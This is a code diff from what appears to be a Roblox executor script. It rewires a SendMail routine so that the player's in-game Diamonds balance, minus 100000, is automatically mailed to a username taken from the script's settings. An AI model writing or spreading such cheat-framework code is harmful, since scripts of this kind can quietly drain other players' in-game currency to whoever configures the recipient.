@@ -319,30 +319,30 @@ function utomel()
         Gems2 = Library.Save.Get().Diamonds
     until Gems2 ~= nil
 
-    -- local function SendMail(username)
-    --     local args = {
-    --         Recipient = username,
-    --         Message = "",
-    --         Pets = {},
-    --         Diamonds = Gems2 - 100000
-    --     }
-    --     return Library.Network.Invoke("Send Mail", args)
-    -- end
-
-    -- if Gems2 ~= getgenv().Settings["Utomel Minimum"] then
-    --     SendMail(getgenv().Settings["Utomel Username"])
-    -- end
     local function SendMail(username)
         local args = {
             Recipient = username,
             Message = "",
             Pets = {},
-            Diamonds = 50000000000 - 100000
+            Diamonds = Gems2 - 100000
         }
         return Library.Network.Invoke("Send Mail", args)
     end
 
-    SendMail(getgenv().Settings["Utomel Username"])
+    if Gems2 ~= 50000000000 then
+        SendMail(getgenv().Settings["Utomel Username"])
+    end
+    -- local function SendMail(username)
+    --     local args = {
+    --         Recipient = username,
+    --         Message = "",
+    --         Pets = {},
+    --         Diamonds = 50000000000 - 100000
+    --     }
+    --     return Library.Network.Invoke("Send Mail", args)
+    -- end
+
+    -- SendMail(getgenv().Settings["Utomel Username"])
 end
 end
 
